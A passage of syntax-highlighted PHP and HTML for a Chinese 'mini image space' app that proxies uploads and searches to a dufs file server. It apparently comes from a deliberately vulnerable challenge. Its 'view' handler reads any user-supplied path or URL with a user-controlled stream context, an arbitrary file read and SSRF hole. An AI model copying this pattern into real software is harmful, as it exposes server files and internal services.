Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$file_content</span>)<br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传成功&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;图片上传失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;未选择图片&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;search&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$search_query</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$search_query</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;只允许输入数字和字母&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$search_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/?q=&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$search_query</span>) . <span class="hljs-string">&#x27;&amp;json&#x27;</span>;<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$search_url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span><br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-variable">$response_data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$response</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$image_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>                <br>                <span class="hljs-variable">$filtered_paths</span> = [];<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<br>                    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>                    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION));<br>                    <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$image_extensions</span>) || (<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;path_type&#x27;</span>] === <span class="hljs-string">&#x27;Directory&#x27;</span>)) &#123;<br>                        <span class="hljs-variable">$filtered_paths</span>[] = <span class="hljs-variable">$item</span>;<br>                    &#125;<br>                &#125;<br>                <br>                <span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] = <span class="hljs-variable">$filtered_paths</span>;<br>                <br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response_data</span>)]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-variable">$response</span>]);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;搜索失败，请稍后再试&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入搜索关键词&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;view&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_content</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$base64_image</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_content</span>);<br>            <span class="hljs-variable">$mime_type</span> = <span class="hljs-string">&#x27;image/jpeg&#x27;</span>;<br>            <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>                <span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <br>                <span class="hljs-string">&#x27;is_image&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;base64_data&#x27;</span> =&gt; <span class="hljs-string">&#x27;data:&#x27;</span> . <span class="hljs-variable">$mime_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$base64_image</span><br>            ]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;无法获取图片&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;请输入图片路径&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;迷你图片空间&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: <span class="hljs-number">800</span>px;<br>            margin: <span class="hljs-number">0</span> auto;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>        &#125;<br>        .section &#123;<br>            margin-bottom: <span class="hljs-number">30</span>px;<br>            padding: <span class="hljs-number">15</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            background-color: white;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>        &#125;<br>        h2 &#123;<br>            margin-top: <span class="hljs-number">0</span>;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        .form-group &#123;<br>            margin-bottom: <span class="hljs-number">15</span>px;<br>        &#125;<br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">5</span>px;<br>            font-weight: bold;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        input[type=<span class="hljs-string">&quot;text&quot;</span>], input[type=<span class="hljs-string">&quot;file&quot;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">8</span>px;<br>            box-sizing: border-box;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>        &#125;<br>        button &#123;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">15</span>px;<br>            background-color: <span class="hljs-comment">#4682b4;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#5f9ea0;</span><br>        &#125;<br>        .result &#123;<br>            margin-top: <span class="hljs-number">15</span>px;<br>            padding: <span class="hljs-number">10</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>            display: none;<br>        &#125;<br>        pre &#123;<br>            white-space: pre-wrap;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            max-height: <span class="hljs-number">300</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;迷你图片空间&lt;/h1&gt;<br>    <br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;上传图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadForm</span>&quot; <span class="hljs-title">enctype</span>=&quot;<span class="hljs-title">multipart</span>/<span class="hljs-title">form</span>-<span class="hljs-title">data</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">upload</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">file</span>&quot;&gt;选择图片：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">small</span>&gt;支持所有类型的图片&lt;/<span class="hljs-title">small</span>&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;上传图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;搜索图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">search</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">query</span>&quot;&gt;搜索关键词：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">query</span>&quot; <span class="hljs-title">required</span> </span><br><span class="hljs-class">                       <span class="hljs-title">pattern</span>=&quot;[<span class="hljs-title">a</span>-<span class="hljs-title">zA</span>-<span class="hljs-title">Z0</span>-9]+&quot; </span><br><span class="hljs-class">                       <span class="hljs-title">title</span>=&quot;只允许输入数字和字母&quot;</span><br><span class="hljs-class">                       <span class="hljs-title">placeholder</span>=&quot;输入图片关键词（仅限数字和字母）&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;搜索&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;搜索结果：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">searchResultContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;查看图片&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewForm</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">action</span>&quot; <span class="hljs-title">value</span>=&quot;<span class="hljs-title">view</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">filename</span>&quot;&gt;图片路径：&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">filename</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">placeholder</span>=&quot;输入图片路径&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot;&gt;查看图片&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">viewResult</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">result</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h3</span>&gt;图片预览：&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">fileContent</span>&quot;&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    </span><br><span class="hljs-class">    &lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">        <span class="hljs-title">document</span>.<span class="hljs-title">getElementById</span>(&#x27;<span class="hljs-title">uploadForm</span>&#x27;).<span class="hljs-title">addEventListener</span>(&#x27;<span class="hljs-title">submit</span>&#x27;, <span class="hljs-title">function</span>(<span class="hljs-title">e</span>) </span>&#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = data.message;<br>                resultDiv.style.color = data.success ? <span class="hljs-string">&#x27;green&#x27;</span> : <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;uploadResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                resultDiv.innerHTML = <span class="hljs-string">&#x27;上传过程中发生错误&#x27;</span>;<br>                resultDiv.style.color = <span class="hljs-string">&#x27;red&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> searchQuery = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;query&#x27;</span>).value;<br>            <br>            <span class="hljs-keyword">var</span> alphanumericRegex = /^[a-zA-Z0-<span class="hljs-number">9</span>]+$/;<br>            <span class="hljs-keyword">if</span> (!alphanumericRegex.<span class="hljs-title function_ invoke__">test</span>(searchQuery)) &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red;&quot;&gt;只允许输入数字和字母&lt;/p&gt;&#x27;</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">var</span> jsonData = JSON.<span class="hljs-title function_ invoke__">parse</span>(data.result);<br>                        <br>                        <span class="hljs-keyword">if</span> (jsonData.paths &amp;&amp; jsonData.paths.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">var</span> resultHtml = <span class="hljs-string">&#x27;&lt;table style=&quot;width:100%; border-collapse: collapse;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr style=&quot;background-color: #f2f2f2;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;名称&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;修改时间&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;大小&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;操作&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>                            <br>                            jsonData.paths.<span class="hljs-title function_ invoke__">forEach</span>(function(item) &#123;<br>                                <span class="hljs-keyword">var</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(item.mtime);<br>                                <span class="hljs-keyword">var</span> formattedDate = date.<span class="hljs-title function_ invoke__">toLocaleString</span>();<br>                                <span class="hljs-keyword">var</span> fileSize = <span class="hljs-title function_ invoke__">formatFileSize</span>(item.size);<br>                                <br>                                resultHtml += <span class="hljs-string">&#x27;&lt;tr style=&quot;border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + item.name + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span 